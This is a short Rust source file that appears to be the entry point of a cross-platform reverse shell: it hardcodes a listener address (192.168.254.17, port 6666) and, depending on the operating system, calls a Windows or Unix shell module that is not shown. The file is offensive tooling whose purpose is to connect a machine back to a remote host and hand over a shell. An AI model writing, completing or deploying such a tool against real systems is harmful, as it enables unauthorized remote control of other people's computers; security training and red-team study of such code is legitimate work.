#[cfg(unix)]
mod unix_shell;

// Windows shell

#[cfg(windows)]
mod windows_shell;

fn main() {

    // TODO Update dynamically
    // let ip = String::from("127.0.0.1");
    let ip = String::from("192.168.254.17");
    let port = String::from("6666");

    if cfg!(target_os = "windows"){
        #[cfg(windows)]
        windows_shell::shell(ip, port);
    }
    else {
        #[cfg(unix)]
        unix_shell::shell(ip, port);
    };
}
